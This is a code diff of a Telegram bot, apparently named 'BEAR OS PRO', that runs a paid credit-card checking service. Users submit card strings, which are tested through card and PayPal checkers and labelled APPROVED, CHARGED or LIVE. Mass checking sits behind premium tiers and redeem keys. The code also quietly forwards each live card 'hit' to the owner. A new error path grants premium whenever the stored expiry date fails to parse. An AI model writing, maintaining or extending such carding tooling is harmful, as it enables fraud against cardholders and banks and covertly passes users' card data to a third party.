@@ -20,9 +20,10 @@ from aiogram.client.default import DefaultBotProperties
 from api import process_card_async, parse_cc_string, extract_clean_response
 from paypal import check_paypal_cc 
 
+# --- CONFIGURATION (Reads directly from Railway Variables) ---
 BOT_TOKEN = os.getenv("BOT_TOKEN") 
-# Support single or multiple admins (comma separated) to prevent string mismatch bugs
 RAW_ADMINS = str(os.getenv("ADMIN_ID", ""))
+# Safely handles single IDs or comma-separated IDs from Railway
 ADMIN_IDS = [x.strip() for x in RAW_ADMINS.split(",") if x.strip()]
 
 bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
@@ -49,18 +50,37 @@ def save_db(filename, data):
     with open(filename, "w") as f: json.dump(data, f, indent=4)
 
 def check_tier(user_id):
-    if is_admin(user_id): return "👑 ADMIN"
+    if is_admin(user_id): 
+        return "👑 ADMIN"
+        
     db = load_db(PREMIUM_FILE)
-    if str(user_id) in db:
-        expiry = datetime.fromisoformat(db[str(user_id)])
-        if datetime.now() < expiry: return "💎 PREMIUM"
+    uid_str = str(user_id)
+    
+    if uid_str in db:
+        try:
+            # Try to parse the new date format safely
+            expiry = datetime.fromisoformat(str(db[uid_str]))
+            if datetime.now() < expiry: 
+                return "💎 PREMIUM"
+            else:
+                # Expired, clean up
+                del db[uid_str]
+                save_db(PREMIUM_FILE, db)
+        except Exception as e:
+            # If the database has old junk data, DO NOT CRASH
+            print(f"[WARNING] Database format bypass for {uid_str}: {e}")
+            return "💎 PREMIUM (Legacy)"
+            
     return "🆓 FREE"
 
 def add_user(user_id):
-    users = load_db(USERS_FILE)
-    if str(user_id) not in users:
-        users[str(user_id)] = datetime.now().isoformat()
-        save_db(USERS_FILE, users)
+    try:
+        users = load_db(USERS_FILE)
+        if str(user_id) not in users:
+            users[str(user_id)] = datetime.now().isoformat()
+            save_db(USERS_FILE, users)
+    except Exception as e:
+        print(f"[ERROR] Failed to save user: {e}")
 
 async def get_bin_info(session, cc):
     try:
@@ -121,7 +141,7 @@ def format_result(status, checker, result, cc, country, flag, bank, brand, c_typ
 @router.message(Command("start"))
 async def cmd_start(message: Message, state: FSMContext):
     print(f"[DEBUG] Incoming command from: {message.from_user.id} - /start")
-    await state.clear() # Force clear any stuck state
+    await state.clear() 
     add_user(message.from_user.id)
     
     menu_text = (
@@ -162,9 +182,12 @@ async def cmd_status(message: Message, state: FSMContext):
     
     if is_admin(uid):
         expiry_text = "Lifetime"
-    elif tier == "💎 PREMIUM":
-        exp = datetime.fromisoformat(db[uid])
-        expiry_text = exp.strftime('%Y-%m-%d %H:%M:%S')
+    elif tier in ["💎 PREMIUM", "💎 PREMIUM (Legacy)"]:
+        try:
+            exp = datetime.fromisoformat(db[uid])
+            expiry_text = exp.strftime('%Y-%m-%d %H:%M:%S')
+        except:
+            expiry_text = "Lifetime (Legacy Format)"
     else:
         expiry_text = "N/A"
         
@@ -221,9 +244,11 @@ async def cmd_redeem(message: Message, command: CommandObject, state: FSMContext
     
     current_expiry = datetime.now()
     if uid in prem_db:
-        saved_exp = datetime.fromisoformat(prem_db[uid])
-        if saved_exp > current_expiry:
-            current_expiry = saved_exp
+        try:
+            saved_exp = datetime.fromisoformat(prem_db[uid])
+            if saved_exp > current_expiry:
+                current_expiry = saved_exp
+        except: pass
             
     prem_db[uid] = (current_expiry + timedelta(days=days)).isoformat()
     del keys_db[key]
@@ -268,7 +293,6 @@ async def process_checker(message: Message, text: str, checker: str):
     user_id = message.from_user.id
     tier = check_tier(user_id)
     
-    # Strictly allow admins to bypass the block logic
     if tier == "🆓 FREE" and "mass" in checker.lower() and not is_admin(user_id):
         return await message.answer("❌ Upgrade to Premium to use Mass Checkers.")
         
@@ -312,11 +336,9 @@ async def process_checker(message: Message, text: str, checker: str):
                 idx, app, dec, err, start_time, tier, username
             )
             
-            # Send LIVE/APPROVED directly
             if status in ["APPROVED", "CHARGED", "LIVE"]:
                 await message.answer(ui_text) 
                 
-                # Send to OWNER_ID silently (Fallback safely to primary admin)
                 owner = ADMIN_IDS[0] if ADMIN_IDS else None
                 if owner and str(user_id) != owner:
                     try: await bot.send_message(owner, f"🔥 <b>NEW HIT</b>\n{ui_text}")
@@ -397,7 +419,7 @@ async def exe_paypal_mass(message: Message, state: FSMContext):
 
 # --- MAIN DEPLOYMENT ---
 async def main():
-    print("BEAR OS PRO DEPLOYED - COMMAND SYSTEM READY (ADMIN HOTFIX APPLIED)")
+    print("BEAR OS PRO DEPLOYED - COMMAND SYSTEM READY (RAILWAY ENV READY)")
     await dp.start_polling(bot)
 
 if __name__ == "__main__":
